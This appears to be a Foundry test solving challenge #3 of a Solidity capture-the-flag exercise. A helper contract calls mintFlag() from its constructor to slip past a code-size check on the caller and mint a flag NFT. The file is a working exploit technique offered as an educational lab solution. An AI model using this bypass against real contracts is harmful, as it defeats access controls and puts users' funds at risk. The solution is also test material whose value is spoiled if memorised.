// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {BaseTest} from "../BaseTest.sol";
import {Challenge3} from "../../src/Challenge3.sol";
import {NFTFlags} from "../../src/NFTFlags.sol";

contract CallChallenge3 {
    // constructor that calls mintFlag
    // during the constructor, the code size of the contract is 0
    constructor(Challenge3 challenge3) {
        challenge3.mintFlag();
    }
}

contract Challenge3Test is BaseTest {
    Challenge3 challenge3;

    function setUp() public {
        setUpChallenges();

        challenge3 = new Challenge3(address(nftFlags));
        vm.prank(ADMIN);
        nftFlags.addAllowedMinter(address(challenge3));
    }

    function test_challenge3() public {
        vm.startPrank(PLAYER, PLAYER);
        
        // Step 1: call the mintFlag function from inside the constructor
        // This will cause the code size of the constructor contract to be 0
        new CallChallenge3(challenge3);
        
        // DONE: You should have obtained the flag for challenge #3
        assertTrue(nftFlags.hasMinted(PLAYER, 3));
    }
}
